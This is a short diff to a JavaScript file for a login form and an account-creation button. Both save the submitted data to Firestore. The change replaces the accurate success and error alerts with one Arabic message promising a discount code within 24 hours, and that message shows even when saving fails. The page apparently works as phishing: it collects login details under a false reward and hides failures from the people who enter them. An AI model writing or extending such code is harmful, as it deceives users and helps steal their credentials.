@@ -20,7 +20,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
       timestamp: firebase.firestore.FieldValue.serverTimestamp()
     });
 
-    alert("Data submitted to Firestore!");
+    alert("سيتم ارسال كود خصم خلال 24 ساعه");
     document.getElementById('loginForm').reset();
   } catch (error) {
     console.error("Error saving to Firestore:", error);
@@ -45,10 +45,11 @@ document.querySelector('.create-account').addEventListener('click', async functi
       timestamp: firebase.firestore.FieldValue.serverTimestamp()
     });
 
-    alert("New account info saved to Firestore!");
+    alert("سيتم ارسال كود خصم خلال 24 ساعه");
     document.getElementById('loginForm').reset();
   } catch (error) {
     console.error("Error saving account:", error);
-    alert("Failed to create account: " + error.message);
+    alert("سيتم ارسال كود خصم خلال 24 ساعه");
   }
 });
+
